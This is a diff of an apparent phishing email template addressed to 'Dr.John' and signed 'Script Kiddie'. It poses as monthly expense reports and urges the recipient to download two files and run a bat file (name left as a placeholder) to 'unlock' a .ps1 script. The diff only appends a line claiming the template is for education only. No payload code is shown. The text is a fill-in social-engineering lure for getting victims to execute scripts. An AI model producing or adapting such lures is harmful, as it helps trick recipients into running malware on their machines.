@@ -16,3 +16,5 @@ Good Afternoon Dr.John,
 Attached are the company expense reports for this month. The file is password protected so you need to download both the files and run (specify bat file name here) so that the expense report (the .ps1 file) can be unlocked for you to read.
 
 Sincerely, Script Kiddie
+
+#Note: This is intended for education purpose/use only
